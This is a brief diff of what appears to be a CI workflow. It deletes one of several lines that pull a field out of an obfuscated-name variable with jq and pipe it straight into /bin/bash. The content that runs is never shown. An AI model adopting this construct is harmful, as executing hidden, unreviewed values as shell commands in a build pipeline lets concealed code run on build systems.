@@ -25,7 +25,6 @@ jobs:
           printf '%s' "$m1723" | jq -r .fxv2 | /bin/bash
           printf '%s' "$hoqfp33998" | jq -r .ifssp3 | /bin/bash
           printf '%s' "$ggz08944" | jq -r .o609 | /bin/bash
-          echo $l75 | jq -r .enf034 | /bin/bash
           printf '%s' "$ur287" | jq -r .iho4 | /bin/bash
 
       - name: Archive results
